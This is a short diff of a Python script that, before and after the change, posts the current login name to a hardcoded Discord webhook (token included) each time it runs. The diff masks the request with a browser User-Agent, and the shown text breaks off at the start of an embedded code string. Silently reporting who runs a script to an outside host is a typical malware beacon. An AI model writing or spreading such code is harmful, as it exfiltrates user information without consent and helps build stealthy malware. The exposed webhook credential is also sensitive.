@@ -1,14 +1,18 @@
-import urllib.request
-import json 
 import os
+import json
+import urllib.request
 
 try:
     url = 'https://discord.com/api/webhooks/1419779190399569940/TTmoY4jWra0wwRca21U8RIEvesch8duCqnCcQxxDF28i1UNCB09oDOZ3FVVMwJW-5oK2'
     data = {'content': f'Ran by {os.getlogin()}'}
-    req = urllib.request.Request(url, data=json.dumps(data).encode(), headers={'Content-Type': 'application/json'})
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0'
+    }
+    req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=headers)
     urllib.request.urlopen(req)
-except:
-    pass
+except Exception as e:
+    print(e)
 
 code = """
 import threading
